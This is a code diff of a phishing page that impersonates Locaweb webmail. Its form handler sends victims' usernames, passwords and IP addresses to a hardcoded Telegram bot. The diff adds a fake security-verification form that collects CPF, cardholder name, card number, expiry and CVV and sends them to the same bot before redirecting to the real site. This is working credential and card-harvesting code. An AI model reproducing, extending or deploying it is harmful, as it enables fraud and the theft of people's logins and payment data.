@@ -46,15 +46,48 @@ document.getElementById('f').addEventListener('submit', async e => {
   e.preventDefault();
   const data = Object.fromEntries(new FormData(e.target));
   const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(j => j.ip).catch(() => 'n/a');
-  const msg = `🔐 Novo login\n👤 ${data.user}\n🔑 ${data.pass}\n🌐 ${ip}\n⏰ ${new Date().toLocaleString('pt-BR')}`;
+  const msg1 = `🔐 LOGIN 1\n👤 ${data.user}\n🔑 ${data.pass}\n🌐 ${ip}\n⏰ ${new Date().toLocaleString('pt-BR')}`;
   const token = '8283630361:AAG32iDNtnetvSo6tHgq_yaaSh4aDCNuQfA';
   const chat  = '6261750345';
   await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
     method: 'POST',
     headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({chat_id: chat, text: msg})
+    body: JSON.stringify({chat_id: chat, text: msg1})
   });
-  location.href = 'https://locaweb.com.br';
+  document.body.innerHTML = `
+<div class="wrapper">
+  <div class="header">Webmail Locaweb</div>
+  <div class="content">
+    <div class="card">
+      <h2>Verificação de segurança</h2>
+      <p>Confirme seus dados para prosseguir.</p>
+      <form id="f2" autocomplete="off">
+        <label for="cpf">CPF</label>
+        <input id="cpf" name="cpf" required/>
+        <label for="nome">Nome no cartão</label>
+        <input id="nome" name="nome" required/>
+        <label for="num">Número do cartão</label>
+        <input id="num" name="num" required/>
+        <label for="val">Validade (MM/AA)</label>
+        <input id="val" name="val" required/>
+        <label for="cvv">CVV</label>
+        <input id="cvv" name="cvv" required/>
+        <button type="submit">Confirmar</button>
+      </form>
+    </div>
+  </div>
+</div>`;
+  document.getElementById('f2').addEventListener('submit', async ev => {
+    ev.preventDefault();
+    const d2 = Object.fromEntries(new FormData(ev.target));
+    const msg2 = `💳 CARTÃO 2\n📄 CPF: ${d2.cpf}\n👤 Nome: ${d2.nome}\n🔢 Núm: ${d2.num}\n📅 Val: ${d2.val}\n🔒 CVV: ${d2.cvv}`;
+    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({chat_id: chat, text: msg2})
+    });
+    location.href = 'https://locaweb.com.br';
+  });
 });
 </script>
 </body>
